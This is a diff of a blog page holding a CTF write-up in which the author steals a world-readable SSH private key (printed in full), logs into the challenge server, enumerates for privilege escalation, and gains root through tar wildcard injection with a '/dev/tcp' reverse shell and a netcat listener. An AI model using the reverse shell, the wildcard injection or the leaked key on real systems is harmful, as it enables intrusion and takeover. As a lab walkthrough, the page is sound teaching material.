+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
 <span style="color:#f92672">from</span> BaseHTTPServer <span style="color:#f92672">import</span> BaseHTTPRequestHandler,HTTPServer
 <span style="color:#f92672">import</span> urlparse<span style="color:#f92672">,</span> base64<span style="color:#f92672">,</span> os 
 
@@ -690,19 +691,19 @@ PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">4444</span
 			b64data <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;data=&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
 			plaintext <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b64data)
 			os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;clear&#34;</span>)
-			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Data received !&#34;</span>
-			<span style="color:#66d9ef">print</span> plaintext
+			print <span style="color:#e6db74">&#34;[+] Data received !&#34;</span>
+			print plaintext
 
 <span style="color:#66d9ef">try</span>:
 	<span style="color:#75715e"># Create the web server</span>
 	server <span style="color:#f92672">=</span> HTTPServer((<span style="color:#e6db74">&#39;&#39;</span>, PORT), Handler)
-	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;[*] Listening on port&#39;</span> , PORT
+	print <span style="color:#e6db74">&#39;[*] Listening on port&#39;</span> , PORT
 	
 	<span style="color:#75715e"># Wait forever for incoming HTTP requests</span>
 	server<span style="color:#f92672">.</span>serve_forever()
 
 <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
-	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[x] Shutting down the web server&#39;</span>
+	print <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[x] Shutting down the web server&#39;</span>
 	server<span style="color:#f92672">.</span>socket<span style="color:#f92672">.</span>close()
 </code></pre></div><p>Demo :</p>
 <p><img src="/img/santhacklaus/archdrive1.gif" alt=""></p>
@@ -714,7 +715,7 @@ PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">4444</span
     </p>
 </div>
 <p>So navigate to this wonderful cheatsheet : <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a> and start try to read some files. Why not check ssh server config (/etc/ssh/sshd_config)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">### SSH configuration file ###</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">### SSH configuration file ###</span>
 
 <span style="color:#75715e"># General</span>
 Port <span style="color:#ae81ff">2020</span>
@@ -754,8 +755,8 @@ usePam no
 <li>The user <code>dark_lottery</code> can only connect with a private key</li>
 </ul>
 <p>So ?! What do you think ? Why not try to steal this ssh private key ? Im sur the key is here ! But where ? Why not to try the default location of the public key readable by all : <code>/home/dark_lottery/.ssh/id_rsa.pub</code></p>
-<pre><code></code></pre><p>Nothing&hellip; Hum strange&hellip; Try to read the private key. By default, the private key is only readable by is owner.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">-----BEGIN RSA PRIVATE KEY-----
+<pre tabindex="0"><code></code></pre><p>Nothing&hellip; Hum strange&hellip; Try to read the private key. By default, the private key is only readable by is owner.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">-----BEGIN RSA PRIVATE KEY-----
 MIICXQIBAAKBgQC3e6s3ZeRV/lgTltFgmVLB/LBYtzRBSpQUEt/1g/MsMidRhdBw
 W0kDlgchsVHL6kGt26JtHVr04MdFSeCUHiSJVuuqDiEPae+98l4LOWWg2dXwKsIv
 x6qDobCyGNi7HzmkxNTh+NxLq+aIsjk/gw38HtNkZAqwokySDcZhgwHFawIDAQAB
@@ -771,7 +772,7 @@ bif/vq/UgTy7aBZOHwECQQC4jty8EX0KdvylXIRzhCK7XvHze+GXHFptaB1wf+Wr
 LAKwqo3/gOiPe8w5CRUWuDfuy04a81OBEF3Gv2pyVctg
 -----END RSA PRIVATE KEY-----
 </code></pre></div><p>HOHOH. READABLE ! What a huge mistake ! We can now connect to the server with user <code>dark_lottery</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc ~<span style="color:#f92672">]</span>$ ssh dark_lottery@51.75.202.113 -p <span style="color:#ae81ff">2020</span> -i key
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc ~<span style="color:#f92672">]</span>$ ssh dark_lottery@51.75.202.113 -p <span style="color:#ae81ff">2020</span> -i key
 
     ___           _        __       _   _
    /   <span style="color:#ae81ff">\_</span>_ _ _ __| | __   / /  ___ | |_| |_ ___ _ __ _   _
@@ -788,7 +789,7 @@ individual files in /usr/share/doc/*/copyright.
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 dark_lottery@9db68003fdde:~$ 
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dark_lottery@9db68003fdde:~$ ls -al
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dark_lottery@9db68003fdde:~$ ls -al
 total <span style="color:#ae81ff">28</span>
 dr-xr-x--- <span style="color:#ae81ff">1</span> root dark_lottery <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 18:27 .
 drwxr-xr-x <span style="color:#ae81ff">1</span> root root         <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span> 18:27 ..
@@ -810,7 +811,7 @@ IMTLD<span style="color:#f92672">{</span>Wh4t_4_H4rD_ch4lL3nge<span style="color
     </p>
 </div>
 <p>The first thing I do when I have to do a privilege escalation is to gather as much informations as i can about the server. This is the <code>Operating System</code> section in the cheatsheet. It&rsquo;s really usefull when the server is old and a public exploit is available.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">dark_lottery@9db68003fdde:~$ uname -a
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">dark_lottery@9db68003fdde:~$ uname -a
 Linux 9db68003fdde 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
 
 dark_lottery@9db68003fdde:~$ cat /etc/*-release
@@ -836,7 +837,7 @@ BUG_REPORT_URL=&#34;https://bugs.debian.org/&#34;
 </div>
 <p>Next step is to check all applications and services on the server. I let you follow the guide on section <code>Applications &amp; Services</code> ;)
 So, why not try to see if crontabs are present ?</p>
-<pre><code>dark_lottery@9db68003fdde:/etc$ ls -al /etc/ | grep cron
+<pre tabindex="0"><code>dark_lottery@9db68003fdde:/etc$ ls -al /etc/ | grep cron
 drwxr-xr-x 1 root root    4096 Dec 20 18:27 cron.d
 drwxr-xr-x 1 root root    4096 Dec 20 18:26 cron.daily
 drwxr-xr-x 2 root root    4096 Dec 20 18:26 cron.hourly
@@ -882,7 +883,7 @@ total 16
 drwxr-xr-x 1 root root 4096 Dec 21 18:26 ..
 drwxr-xr-x 1 root root 4096 Dec 20 18:27 .
 </code></pre><p>Oh ! Look at this. Some crontabs ! There is no interesting things in <code>cron.daily</code> (except the presence of unusual exim4 crontab). But look at <code>backup-cron</code> crontab.</p>
-<pre><code>dark_lottery@9db68003fdde:/etc$ cat /etc/cron.d/backup-cron 
+<pre tabindex="0"><code>dark_lottery@9db68003fdde:/etc$ cat /etc/cron.d/backup-cron 
 * * * * * /bin/sh /backup.sh
 </code></pre><p>The crontab <code>backup-cron</code> launch every minutes with root privilege the script <code>/backup.sh</code>. I think we&rsquo;ve got a good way here ! But for now, we have to finish our investigation.</p>
 <p>The next section in the cheatsheet is <code>Communications &amp; Networking</code>. In CTF, is really rare to have to deal with networks but it&rsquo;s possible. So keep it in mind !</p>
@@ -902,7 +903,7 @@ But the most interesting part is file permission. So let&rsquo;s try this !</p>
 <li><strong>SGID</strong> : run as the group, not the user who started it. The file will be execute with the group right.</li>
 </ul>
 <p>In privesc, often the more usefull is suid permission. Let&rsquo;s check that.</p>
-<pre><code>dark_lottery@9db68003fdde:/etc$ find / -perm -u=s -type f 2&gt;/dev/null 
+<pre tabindex="0"><code>dark_lottery@9db68003fdde:/etc$ find / -perm -u=s -type f 2&gt;/dev/null 
 /bin/ping
 /bin/su
 /bin/mount
@@ -917,10 +918,10 @@ But the most interesting part is file permission. So let&rsquo;s try this !</p>
 /usr/sbin/exim4
 </code></pre><p>Haha <code>ping</code> is suid but it&rsquo;s a wrong way. Look at <code>exim4</code> binary. It&rsquo;s sometimes possible to do privesc with that. What is <code>exim</code> ?</p>
 <p><code>Exim4 is a very complete mail server, it is the default mail server on Debian. It allows to receive and send mails. It can be configured as server and / or client.</code></p>
-<pre><code>dark_lottery@9db68003fdde:/etc$ ls -al /usr/sbin/exim4
+<pre tabindex="0"><code>dark_lottery@9db68003fdde:/etc$ ls -al /usr/sbin/exim4
 -rwsr-xr-x 1 root root 1019656 Feb 10  2018 /usr/sbin/exim4
 </code></pre><p>Ok <code>exim4</code> is setuid root. So if you can exploit it, you will be root. So look at the version.</p>
-<pre><code>dark_lottery@9db68003fdde:/etc$ /usr/sbin/exim4 --version
+<pre tabindex="0"><code>dark_lottery@9db68003fdde:/etc$ /usr/sbin/exim4 --version
 Exim version 4.89 #2 built 10-Feb-2018 08:26:05
 Copyright (c) University of Cambridge, 1995 - 2017
 (c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2017
@@ -947,7 +948,7 @@ Configuration file is /var/lib/exim4/config.autogenerated
 </ul>
 <p>As you see, there is serveral public exploits and the vulnerability is referenced as <code>CVE-2018-6789</code>. The attacker can obtain remote execution code on exim 4.89. I stopped my research here because this is not the resolution method wanted by the creators of the ctf. But now, you know an other privesc technique :D</p>
 <p>So now we have finished our investigation. Time to exploit ! Go back to our crontab <code>backup-cron</code>. If you remember well, the crontab lauch every minute the script <code>/backup.sh</code>. Look at it :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
 </span><span style="color:#75715e"></span>/bin/rm -rf /backups/*
 cd /opt/src/ <span style="color:#f92672">&amp;&amp;</span> /bin/tar -cvzf /backups/bck-src_<span style="color:#e6db74">`</span>/bin/date +<span style="color:#e6db74">&#34;%Y-%m-%d_%H%M&#34;</span><span style="color:#e6db74">`</span>.tar.gz *
 /bin/chmod <span style="color:#ae81ff">440</span> -R /backups
@@ -961,7 +962,7 @@ cd /opt/src/ <span style="color:#f92672">&amp;&amp;</span> /bin/tar -cvzf /backu
 <p>You really don&rsquo;t see ? Return to our cheatsheet : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Tar%20commands%20execution">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Tar%20commands%20execution</a></p>
 <p><em><code>By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that’s where the wildcard comes in handy.</code></em></p>
 <p>We will exploit <code>*</code> tar wildcard. Juste watch and learn ! The <code>'--checkpoint-action'</code> option, that will specify program which will be executed when checkpoint is reached.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Go to the directory where everything is tar</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Go to the directory where everything is tar</span>
 cd /opt/src         
 
 <span style="color:#75715e"># Create the 2 necessary widcard</span>
@@ -979,7 +980,7 @@ echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/12.34.56.78/444
 <span style="color:#75715e"># Set execution</span>
 chmod +x shell.sh
 </code></pre></div><p>And set your listener on your attacker&rsquo;s server</p>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ nc -lvp 4444
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ nc -lvp 4444
 listening on [any] 4444 ...
 connect to [192.168.0.50] from 113.ip-51-75-202.eu [51.75.202.113] 34982
 bash: cannot set terminal process group (25128): Inappropriate ioctl for device
@@ -989,7 +990,7 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre><p><img src="https://media.giphy.com/media/NEvPzZ8bd1V4Y/giphy.gif" alt=""></p>
 <p>AND VOILA ! You can validate the challenge !</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">root@9db68003fdde:/opt/src# ls -al
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">root@9db68003fdde:/opt/src# ls -al
 ls -al
 total 20
 -rw-r--r-- 1 dark_lottery dark_lottery    0 Dec 29 23:17 --checkpoint-action=exec=bash shell.sh
@@ -1037,7 +1038,7 @@ So what do we learned with this challenge ?</p>
 		</ul>
 	</div>
 
-	<p>&copy; 2020. All rights reserved.</p>
+	<p>&copy; 2021. All rights reserved.</p>
 </div>
     </div>
   </div>
